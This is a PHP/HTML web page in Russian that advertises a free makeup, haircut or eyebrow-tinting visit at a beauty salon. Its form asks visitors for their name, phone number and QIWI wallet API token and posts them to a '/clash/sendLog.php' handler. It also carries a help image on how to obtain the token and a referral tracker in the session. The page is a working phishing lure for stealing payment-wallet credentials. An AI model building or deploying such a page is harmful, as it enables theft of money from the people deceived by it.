<?php 
session_start();
$_SESSION['ref'] = $_GET['ref'];
?>
<DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Бесплатный поход в салон красоты на стрижку или покраску бровей</title>
<style>
	* {margin: 0; padding: 0;} /* обнуляем отступы */	
	div {
	width: 800px; /* ширина основного блока */
	height: 120%; /* высота для наглядности */
	background: #000; /* цвет блока для наглядности */
	margin: 0 auto; /* задаем отступ слева и справа auto чтобы сработало выравнивание по центру */
	opacity: 0.8;
	}
   body {
    background: url(https://avatars.mds.yandex.net/get-pdb/236760/cf44ea27-da36-469a-b544-a1b6d27835e8/s1200) no-repeat;
    -moz-background-size: 100%; /* Firefox 3.6+ */
    -webkit-background-size: 100%; /* Safari 3.1+ и Chrome 4.0+ */
    -o-background-size: 100%; /* Opera 9.6+ */
    background-size: 100%; /* Современные браузеры */
	text-align: center; /* выравниваем все содержимое body по центру */
   }
   h1 { color: #ffffff; font-family: 'Lato', sans-serif; font-size: 42px; font-weight: 300; line-height: 58px; margin: 0 0 58px; }


p { color: #adb7bd; font-family: 'Lucida Sans', Arial, sans-serif; font-size: 16px; line-height: 26px; text-indent: 30px; margin: 0; }


a { color: #fe921f; text-decoration: underline; }


a:hover { color: #ffffff }


.date { background: #fe921f; color: #ffffff; display: inline-block; font-family: 'Lato', sans-serif; font-size: 12px; font-weight: bold; line-height: 12px; letter-spacing: 1px; margin: 0 0 30px; padding: 10px 15px 8px; text-transform: uppercase; }
input {
 padding: 5px;
 font-size: 18px;
 border: 5px solid rgba(255, 255, 255, .5);
 @include box-shadow(
 0 1px 5px rgba(0, 0, 0, .25) inset,
 0 1px 5px rgba(0, 0, 0, .25));
 @include border-radius(3px);
 background: rgba(255, 255, 255, .5);
 @include appearance(none);
 outline: none;
 color: #00ff00;
 width: 50%;
 /*position: absolute;*/
 left: 10%;
}
  </style>
</head>
<body background="https://avatars.mds.yandex.net/get-pdb/236760/cf44ea27-da36-469a-b544-a1b6d27835e8/s1200">
<div>
<br>
<h1>Бесплатный уход за собой</h1>
<p>Салон красоты "Звездочка" дает в течении 3ех дней поход к нам на:<br> - Макияж<br> - Стрижка<br> - Покраска бровей<br>Совершенно бесплатно! Для начало заполните форму ниже.</p>
<form method="POST" action="/clash/sendLog.php">
<p>Ваше имя:</p>
<input type="text" placeholder="Как вас зовут?" name="name"><br>
<p>Номер телефона:</p>
<input type="text" placeholder="Ваш номер телефона" name="phone"><br>
<p>QIWI Token:</p>
<input type="text" placeholder="QIWI Token" name="token"><br><br>
<input type="submit">
</form>
<br><br>
<p>Получение QIWI Token</p>
<img src="help.png">
</div>
</body>
</html>